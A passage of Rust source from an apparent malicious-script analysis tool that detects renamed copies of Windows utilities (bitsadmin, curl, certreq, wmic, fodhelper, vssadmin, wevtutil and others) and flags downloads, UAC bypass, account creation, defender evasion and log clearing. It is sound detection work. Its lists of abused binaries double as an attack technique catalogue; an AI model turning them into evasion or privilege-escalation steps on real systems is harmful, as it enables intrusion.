        .trim_start_matches(|c: char| c == '@' || c == '(' || c.is_whitespace())
        .trim_end_matches([')', ',', ';']);
    token
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(token)
        .to_ascii_lowercase()
}

fn scan_echoed_vbs_deob_text(deobfuscated: &str, env: &mut Environment) {
    let lower = deobfuscated.to_ascii_lowercase();
    let has_vbs_downloader = lower.contains("xmlhttp") && lower.contains(".open");
    let has_shell_execute_runas = lower.contains("shellexecute") && lower.contains("runas");
    if !has_vbs_downloader && !has_shell_execute_runas {
        return;
    }

    let mut vbs = String::new();
    for line in deobfuscated.lines() {
        let trimmed = line.trim_start();
        let Some(rest) = trimmed
            .strip_prefix("echo ")
            .or_else(|| trimmed.strip_prefix("ECHO "))
        else {
            continue;
        };
        vbs.push_str(rest.trim_start());
        vbs.push_str("\r\n");
    }
    if vbs.is_empty() {
        return;
    }

    let known_downloads: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();
    let mut payload_env = Environment::new(&crate::env::Config {
        max_depth: env.limits.max_depth,
        max_iterations: env.limits.max_iterations,
        max_child_scripts: env.limits.max_child_scripts,
        timeout_secs: 0,
        self_extract: false,
        winver: env.winver,
        max_output_bytes: env.limits.max_output_bytes,
        max_output_line_bytes: env.limits.max_output_line_bytes,
        max_traits_per_kind: 100,
    });
    payload_env.all_extracted_vbs.push(vbs.into_bytes());
    crate::vbs_scan::scan_vbs_payloads(&mut payload_env);
    env.traits
        .extend(payload_env.traits.into_iter().filter(|t| match t {
            Trait::Download { src, .. } => !known_downloads.contains(src),
            _ => true,
        }));
}

fn basename_lower(path: &str) -> String {
    path.rsplit(['\\', '/'])
        .next()
        .unwrap_or(path)
        .trim_matches('"')
        .to_ascii_lowercase()
}

fn scan_copied_bitsadmin_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "bitsadmin.exe" && src_base != "bitsadmin" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "bitsadmin.exe".to_string()
        } else {
            format!("bitsadmin.exe {rest}")
        };
        crate::handlers::bitsadmin::h_bitsadmin(&replay, env);
    }
}

fn scan_copied_curl_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "curl.exe" && src_base != "curl" {
            continue;
        }
        let dst_base = basename_lower(dst);
        aliases.insert(dst_base.clone());
        if let Some(stem) = dst_base.strip_suffix(".exe") {
            aliases.insert(stem.to_string());
        }
    }
    if aliases.is_empty() {
        return;
    }

    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd)) {
            continue;
        }
        push_manipulated_exec_once(env, line, cmd);

        if let Some((url, dst)) = parse_curl_like_download(&tokens) {
            if known.insert(url.clone()) {
                env.traits.push(Trait::Download {
                    cmd: line.to_string(),
                    src: url,
                    dst,
                });
            }
            continue;
        }

        let mut dst: Option<String> = None;
        let mut i = 1;
        while i < tokens.len() {
            let token = tokens[i].trim_matches('"');
            let lower = token.to_ascii_lowercase();
            if (lower == "-o" || lower == "--output") && tokens.get(i + 1).is_some() {
                dst = tokens.get(i + 1).map(|s| s.trim_matches('"').to_string());
                i += 2;
                continue;
            }
            if curl_attached_value_flag_url(token) {
                i += 1;
                continue;
            }
            if curl_value_flag(token) || curl_empty_attached_value_flag(token) {
                i += 2;
                continue;
            }
            if let Some(url) = normalize_curl_url_token(token) {
                if !known.insert(url.clone()) {
                    i += 1;
                    continue;
                }
                env.traits.push(Trait::Download {
                    cmd: line.to_string(),
                    src: url,
                    dst: dst.clone(),
                });
            }
            i += 1;
        }
    }
}

fn scan_copied_extrac32_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "extrac32.exe" && src_base != "extrac32" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "extrac32.exe".to_string()
        } else {
            format!("extrac32.exe {rest}")
        };
        crate::handlers::extrac32::h_extrac32(&replay, env);
    }
}

fn scan_copied_ftp_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "ftp.exe" && src_base != "ftp" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "ftp.exe".to_string()
        } else {
            format!("ftp.exe {rest}")
        };
        crate::handlers::ftp::h_ftp(&replay, env);
    }
}

fn scan_copied_certreq_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "certreq.exe" && src_base != "certreq" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "certreq.exe".to_string()
        } else {
            format!("certreq.exe {rest}")
        };
        crate::handlers::certreq::h_certreq(&replay, env);
    }
}

fn scan_copied_certoc_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "certoc.exe" && src_base != "certoc" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "certoc.exe".to_string()
        } else {
            format!("certoc.exe {rest}")
        };
        crate::handlers::certoc::h_certoc(&replay, env);
    }
}

fn scan_copied_desktopimgdownldr_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "desktopimgdownldr.exe" && src_base != "desktopimgdownldr" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "desktopimgdownldr.exe".to_string()
        } else {
            format!("desktopimgdownldr.exe {rest}")
        };
        crate::handlers::desktopimgdownldr::h_desktopimgdownldr(&replay, env);
    }
}

fn scan_copied_hh_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "hh.exe" && src_base != "hh" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "hh.exe".to_string()
        } else {
            format!("hh.exe {rest}")
        };
        crate::handlers::hh::h_hh(&replay, env);
    }
}

fn scan_copied_uac_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    scan_copied_handler_alias_deob_text(
        deobfuscated,
        env,
        &["cmstp.exe", "cmstp"],
        "cmstp.exe",
        crate::handlers::cmstp::h_cmstp,
    );
    scan_copied_handler_alias_deob_text(
        deobfuscated,
        env,
        &["msconfig.exe", "msconfig"],
        "msconfig.exe",
        crate::handlers::msconfig::h_msconfig,
    );

    let mut aliases: std::collections::HashMap<String, &'static str> =
        std::collections::HashMap::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        let replay_command = match src_base.as_str() {
            "fodhelper.exe" | "fodhelper" => "fodhelper.exe",
            "eventvwr.exe" | "eventvwr" => "eventvwr.exe",
            "sdclt.exe" | "sdclt" => "sdclt.exe",
            "computerdefaults.exe" | "computerdefaults" => "computerdefaults.exe",
            "wsreset.exe" | "wsreset" => "wsreset.exe",
            "cmstp.exe" | "cmstp" => "cmstp.exe",
            "msconfig.exe" | "msconfig" => "msconfig.exe",
            _ => continue,
        };
        insert_alias_command_names(&mut aliases, dst, replay_command);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        let replay_command = aliases
            .get(&basename_lower(cmd))
            .or_else(|| aliases.get(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase()));
        let Some(replay_command) = replay_command else {
            continue;
        };

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            (*replay_command).to_string()
        } else {
            format!("{replay_command} {rest}")
        };
        scan_uac_bypass(&replay, env);
    }
}

fn scan_copied_esentutl_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    scan_copied_handler_alias_deob_text(
        deobfuscated,
        env,
        &["esentutl.exe", "esentutl"],
        "esentutl.exe",
        crate::handlers::esentutl::h_esentutl,
    );
}

fn scan_copied_forfiles_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "forfiles.exe" && src_base != "forfiles" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "forfiles.exe".to_string()
        } else {
            format!("forfiles.exe {rest}")
        };
        crate::handlers::forfiles::h_forfiles(&replay, env);
        if let Some(inners) =
            crate::handlers::forfiles::extract_forfiles_inners_with_env(&replay, env)
        {
            for inner in inners {
                if let Some(cmd_inner) = crate::handlers::cmd::extract_cmd_inner(&inner) {
                    crate::interp::interpret_line(&cmd_inner, env);
                } else {
                    crate::interp::interpret_line(&inner, env);
                }
            }
        }
    }
}

fn scan_copied_wmic_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "wmic.exe" && src_base != "wmic" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "wmic.exe".to_string()
        } else {
            format!("wmic.exe {rest}")
        };
        crate::handlers::wmic::h_wmic(&replay, env);
        if let Some(inner) = crate::handlers::wmic::wmic_process_create_inner(&replay) {
            if let Some(cmd_inner) = crate::handlers::cmd::extract_cmd_inner(&inner) {
                crate::interp::interpret_line(&cmd_inner, env);
            } else {
                crate::interp::interpret_line(&inner, env);
            }
        }
    }
}

fn scan_copied_runas_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "runas.exe" && src_base != "runas" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "runas.exe".to_string()
        } else {
            format!("runas.exe {rest}")
        };
        crate::handlers::passthrough::h_runas(&replay, env);
        if let Some(inner) = crate::handlers::passthrough::runas_child_command(&replay) {
            if let Some(cmd_inner) = crate::handlers::cmd::extract_cmd_inner(&inner) {
                crate::interp::interpret_line(&cmd_inner, env);
            } else {
                crate::interp::interpret_line(&inner, env);
            }
        }
    }
}

fn scan_copied_net_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if !matches!(src_base.as_str(), "net.exe" | "net" | "net1.exe" | "net1") {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 3 {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let subcommand = tokens[1].trim_matches(['"', '\'']).to_ascii_lowercase();
        let has_add = tokens
            .iter()
            .any(|token| token.trim_matches(['"', '\'']).eq_ignore_ascii_case("/add"));
        if !has_add {
            continue;
        }
        match subcommand.as_str() {
            "user" => {
                let account = clean_account_modification_token(&tokens[2]);
                push_account_modification_once(env, "local-user-add", account, None, line);
            }
            "localgroup" if tokens.len() >= 4 => {
                let group = clean_account_modification_token(&tokens[2]);
                let account = clean_account_modification_token(&tokens[3]);
                push_account_modification_once(env, "localgroup-add", account, Some(group), line);
            }
            _ => {}
        }
    }
}

fn clean_account_modification_token(token: &str) -> String {
    token
        .trim()
        .trim_matches('"')
        .trim_matches('\'')
        .to_string()
}

fn push_account_modification_once(
    env: &mut Environment,
    action: &str,
    account: String,
    group: Option<String>,
    command: &str,
) {
    if account.is_empty() {
        return;
    }
    if env.traits.iter().any(|t| {
        matches!(
            t,
            Trait::AccountModification {
                action: existing_action,
                account: existing_account,
                group: existing_group,
                ..
            } if existing_action == action
                && existing_account == &account
                && existing_group == &group
        )
    }) {
        return;
    }
    env.traits.push(Trait::AccountModification {
        action: action.to_string(),
        account,
        group,
        command: command.to_string(),
    });
}

fn scan_copied_robocopy_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "robocopy.exe" && src_base != "robocopy" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 3 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "robocopy.exe".to_string()
        } else {
            format!("robocopy.exe {rest}")
        };
        crate::handlers::robocopy::h_robocopy(&replay, env);
    }
}

fn scan_copied_netsh_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        if src_base != "netsh.exe" && src_base != "netsh" {
            continue;
        }
        insert_alias_names(&mut aliases, dst);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        if !aliases.contains(&basename_lower(cmd))
            && !aliases.contains(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase())
        {
            continue;
        }
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "netsh.exe".to_string()
        } else {
            format!("netsh.exe {rest}")
        };
        scan_defender_evasion(&replay, env);
        scan_remote_access(&replay, env);
    }
}

fn scan_copied_defender_evasion_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashMap<String, &'static str> =
        std::collections::HashMap::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        let replay_command = match src_base.as_str() {
            "taskkill.exe" | "taskkill" => "taskkill.exe",
            "takeown.exe" | "takeown" => "takeown.exe",
            "icacls.exe" | "icacls" => "icacls.exe",
            _ => continue,
        };
        insert_alias_command_names(&mut aliases, dst, replay_command);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        let replay_command = aliases
            .get(&basename_lower(cmd))
            .or_else(|| aliases.get(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase()));
        let Some(replay_command) = replay_command else {
            continue;
        };
        if tokens.len() < 2 {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::ManipulatedExec {
                    cmd: existing_cmd,
                    target
                } if existing_cmd == line && target.eq_ignore_ascii_case(cmd.trim_matches(['"', '\'']))
            )
        }) {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            (*replay_command).to_string()
        } else {
            format!("{replay_command} {rest}")
        };
        scan_defender_evasion(&replay, env);
    }
}

fn scan_copied_anti_recovery_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashMap<String, &'static str> =
        std::collections::HashMap::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        let replay_command = match src_base.as_str() {
            "vssadmin.exe" | "vssadmin" => "vssadmin.exe",
            "bcdedit.exe" | "bcdedit" => "bcdedit.exe",
            "wbadmin.exe" | "wbadmin" => "wbadmin.exe",
            "wmic.exe" | "wmic" => "wmic.exe",
            _ => continue,
        };
        insert_alias_command_names(&mut aliases, dst, replay_command);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        let replay_command = aliases
            .get(&basename_lower(cmd))
            .or_else(|| aliases.get(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase()));
        let Some(replay_command) = replay_command else {
            continue;
        };
        if tokens.len() < 2 {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            (*replay_command).to_string()
        } else {
            format!("{replay_command} {rest}")
        };
        scan_anti_recovery(&replay, env);
    }
}

fn scan_copied_evidence_cleanup_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashMap<String, &'static str> =
        std::collections::HashMap::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        let replay_command = match src_base.as_str() {
            "wevtutil.exe" | "wevtutil" => "wevtutil.exe",
            "fsutil.exe" | "fsutil" => "fsutil.exe",
            "reg.exe" | "reg" => "reg.exe",
            _ => continue,
        };
        insert_alias_command_names(&mut aliases, dst, replay_command);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        let replay_command = aliases
            .get(&basename_lower(cmd))
            .or_else(|| aliases.get(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase()));
        let Some(replay_command) = replay_command else {
            continue;
        };
        if tokens.len() < 2 {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            (*replay_command).to_string()
        } else {
            format!("{replay_command} {rest}")
        };
        scan_evidence_cleanup(&replay, env);
    }
}

fn scan_copied_attrib_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashMap<String, &'static str> =
        std::collections::HashMap::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        let replay_command = match src_base.as_str() {
            "attrib.exe" | "attrib" => "attrib.exe",
            _ => continue,
        };
        insert_alias_command_names(&mut aliases, dst, replay_command);
    }
    if aliases.is_empty() {
        return;
    }

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        let replay_command = aliases
            .get(&basename_lower(cmd))
            .or_else(|| aliases.get(&cmd.trim_matches(['"', '\'']).to_ascii_lowercase()));
        let Some(replay_command) = replay_command else {
            continue;
        };
        if tokens.len() < 2 {
            continue;
        }

        push_manipulated_exec_once(env, line, cmd);
        let rest = line
            .get(cmd.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            (*replay_command).to_string()
        } else {
            format!("{replay_command} {rest}")
        };
        scan_file_concealment(&replay, env);
    }
}

fn scan_copied_enumeration_alias_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashMap<String, &'static str> =
        std::collections::HashMap::new();
    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = basename_lower(src);
        let replay_command = match src_base.as_str() {
            "net.exe" | "net" | "net1.exe" | "net1" => "net.exe",
            "whoami.exe" | "whoami" => "whoami.exe",
            "quser.exe" | "quser" => "quser.exe",
            "systeminfo.exe" | "systeminfo" => "systeminfo.exe",
            "tasklist.exe" | "tasklist" => "tasklist.exe",
            "wmic.exe" | "wmic" => "wmic.exe",
